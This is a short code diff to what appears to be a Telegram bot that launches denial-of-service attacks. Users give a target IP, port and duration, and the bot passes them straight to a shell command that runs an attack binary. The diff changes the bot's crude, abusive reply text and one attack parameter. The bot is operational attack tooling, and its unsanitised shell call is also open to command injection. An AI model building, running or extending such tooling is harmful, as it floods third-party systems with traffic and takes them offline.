@@ -262,7 +262,7 @@ def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"CHUDAI start : {target}:{port} for {time}\nSEC Jabtak YE Attack run krrha hai to iske bichme koi Attack nahe Dalna Bhenchod"
+    response = f"CHUDAI start : {target}:{port} for {time}\nSEC Jabtak YE Attack run krrha hai to iske bichme koi Attack nahe Dalna Bhenchod. FeedbackSend Kar Laude @PsychoVillain19"
     bot.reply_to(message, response)
 
     # Dictionary to store the last time each user ran the /chodo command
@@ -297,7 +297,7 @@ def handle_attack(message):
                 record_command_logs(user_id, '/attack', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply
-                full_command = f"./11124 {target} {port} {time} 30"
+                full_command = f"./11124 {target} {port} {time} 20"
                 subprocess.run(full_command, shell=True)
                 response = f"CHUDAI Complete"
         
